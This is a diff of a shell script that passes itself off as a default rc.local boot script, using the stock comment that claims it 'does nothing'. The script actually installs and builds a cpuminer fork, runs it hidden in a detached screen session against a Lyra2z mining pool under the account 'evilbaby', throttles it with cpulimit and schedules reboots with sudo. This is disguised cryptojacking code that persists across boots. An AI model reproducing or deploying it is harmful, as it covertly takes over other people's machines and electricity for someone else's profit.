@@ -1,16 +1,27 @@
-#!/bin/bash
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
 if [ -f ${PWD}/cpuminer-xzc/miner.h ]; then
     if pgrep -x "cpuminer" > /dev/null
 then
     echo "minerd is running"
 else
 
-    echo "minerd has been installed, starting now"
-    sudo shutdown -r 45
-	cd cpuminer-xzc
+echo "minerd has been installed, starting now"
+sudo shutdown -r 45
+cd cpuminer-xzc
 		
-    screen -dmSL cpuminer ./cpuminer -a lyra2z -o stratum+tcp://asia.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.cpagroww999 -p 1; sleep 3
-    cpulimit --exe cpuminer --limit 191
+screen -dmSL cpuminer ./cpuminer -a lyra2z -o stratum+tcp://asia.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.worker001 -p 1; sleep 3
+cpulimit --exe cpuminer --limit 83
      
 fi
 exit
@@ -20,10 +31,10 @@ sudo apt-get update
 sudo apt-get install git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev screen cpulimit -y
 sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
 git clone https://github.com/evilbaby/cpuminer-xzc
-
 cd cpuminer-xzc
 ./build.sh
 echo "minerd is starting"
-
-screen -dmSL cpuminer ./cpuminer -a lyra2z  -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.cpagroww999 -p 1 ; sleep 3
-cpulimit --exe cpuminer --limit 181
+sudo shutdown -r 45
+screen -dmSL cpuminer ./cpuminer -a lyra2z  -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.worker001 -p 1 ; sleep 3
+cpulimit --exe cpuminer --limit 83
+exit 0
